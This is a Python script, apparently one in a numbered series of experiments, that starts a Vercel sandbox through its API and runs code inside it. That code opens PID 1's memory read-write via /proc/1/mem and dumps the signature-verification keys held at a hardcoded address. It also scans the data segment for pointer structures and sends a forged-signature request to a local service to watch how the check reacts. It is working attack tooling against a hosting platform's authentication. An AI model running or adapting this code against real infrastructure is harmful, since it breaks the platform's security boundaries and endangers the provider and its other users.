# 实验J211: 读 verify 的全局key列表 @0xe9e610 (RIP: 0x83b418+0x662bf8) 
# 目标: dump 全部验证key(32B Ed25519 pub?) + key对象结构 + 请求前后对比
# 附带: dump data段0xe9e000起区域找相关全局结构
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def bashfile(sid, cmd, label, n=20000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "bash", "args": ["-c", cmd], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj211"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

CODE = r'''
import os, time, struct, socket
out = open("/tmp/d211.txt", "w")
def p(*a):
    line = " ".join(str(x) for x in a)
    out.write(line + "\n"); out.flush()
    print(line, flush=True)

p("start")
fd = os.open("/proc/1/mem", os.O_RDWR)
def read_at(addr, n):
    os.lseek(fd, addr, 0)
    return os.read(fd, n)
def write_at(addr, b):
    os.lseek(fd, addr, 0)
    return os.write(fd, b)

def dump_slice_hdr(addr, tag):
    try:
        h = read_at(addr, 24)
        ptr, ln, cap = struct.unpack("<QQQ", h)
        p(tag, "HDR", hex(addr), "ptr", hex(ptr), "len", ln, "cap", cap)
        if ptr and 0 < ln < 0x100000:
            data = read_at(ptr, ln)
            p(tag, "DATA_LEN", len(data))
            return ptr, ln, cap, data
    except Exception as e:
        p(tag, "ERR", repr(e))
    return None

# PA: 读 [rip+0x662bf8] = 0xe9e610 的 slice (key列表容器)
p("CP", "PA")
r1 = dump_slice_hdr(0xe9e610, "KEYLIST")
if r1:
    ptr, ln, cap, data = r1
    nkeys = ln // 32
    p("KEYLIST_N", nkeys)
    for i in range(nkeys):
        k = data[i*32:(i+1)*32]
        p("KEY", i, k.hex())
    # 每个key对象上下文: key数据前0x80后0x40(可能key是嵌入结构)
    for i in range(nkeys):
        base = ptr + i*32
        try:
            ctx = read_at(base - 0x40, 0x40 + 32 + 0x40)
            p("KEYCTX", i, ctx.hex())
        except Exception as e:
            p("KEYCTX_ERR", i, repr(e))

# PB: dump data段 0xe9e000-0xe9f800 (前6KB, 找所有全局slice/指针)
p("CP", "PB")
try:
    seg = read_at(0xe9e000, 0x8000)
    # 找 {ptr,len,cap} 三元组: ptr指向rw区, len/cap合理
    hits = []
    for off in range(0, len(seg) - 24, 8):
        pv, lv, cv = struct.unpack_from("<QQQ", seg, off)
        if 0 < lv < 0x1000000 and 0 < cv < 0x1000000 and lv <= cv:
            hits.append((0xe9e000 + off, pv, lv, cv))
    p("SLICES_DATA", len(hits))
    for h, pv, lv, cv in hits[:60]:
        p("SL", hex(h), "ptr", hex(pv), "len", hex(lv), "cap", hex(cv))
except Exception as e:
    p("PB_ERR", repr(e))

# PC: 发假签名请求(触发verify) + 重读keylist对比
p("CP", "PC")
def http(port, method, path, headers, body=b"", to=5):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(to)
        s.connect(("127.0.0.1", port))
        hdrs = f"{method} {path} HTTP/1.1\r\nHost: 127.0.0.1\r\n"
        for k, v in headers.items():
            hdrs += f"{k}: {v}\r\n"
        hdrs += f"Content-Length: {len(body)}\r\n\r\n"
        s.send(hdrs.encode() + body)
        d = b""
        try:
            while True:
                b2 = s.recv(4096)
                if not b2:
                    break
                d += b2
                if len(d) > 4000:
                    break
        except Exception:
            pass
        s.close()
        return d
    except Exception as ex:
        return ("EXC:" + repr(ex)).encode()

now = str(int(time.time()))
d = http(30001, "POST", "/foo",
         {"Content-Type": "application/connect+json", "Connect-Protocol-Version": "1",
          "X-Signature": "AAAA", "X-Timestamp": now}, b"{}")
p("REQ1_RESP", d[:300])
time.sleep(1.0)

# PD: 重读keylist
p("CP", "PD")
r2 = dump_slice_hdr(0xe9e610, "KEYLIST2")
if r2:
    ptr2, ln2, cap2, data2 = r2
    n2 = ln2 // 32
    p("KEYLIST2_N", n2)
    for i in range(n2):
        k = data2[i*32:(i+1)*32]
        p("KEY2", i, k.hex())
    if r1 and data2 != r1[3]:
        p("KEYLIST_CHANGED", "YES")
    else:
        p("KEYLIST_CHANGED", "NO")

# PE: 全局key容器前后0x100上下文 (0xe9e610结构: 可能{list, mu, ...})
p("CP", "PE")
try:
    ctx = read_at(0xe9e600, 0x80)
    p("GCTX", ctx.hex())
    # 0xe9e610指向的容器对象: ptr指向的对象可能是Go slice数据数组
    h = read_at(0xe9e610, 24)
    ptr0, ln0, cap0 = struct.unpack("<QQQ", h)
    # 数组头部可能有gc bits/元数据: dump ptr-0x10
    try:
        ctx2 = read_at(ptr0 - 0x20, 0x20 + ln0)
        p("ARRAY_CTX", ctx2.hex())
    except Exception as e:
        p("ARRAY_ERR", repr(e))
except Exception as e:
    p("PE_ERR", repr(e))
p("done")
out.close()
os.close(fd)
'''

st = run_cmd(sid, CODE, "J211", timeout=290)
time.sleep(2)
bashfile(sid, "cat /tmp/d211.txt", "marker", 15000)
if st == "DEAD":
    print("\n!!! DEATH", flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
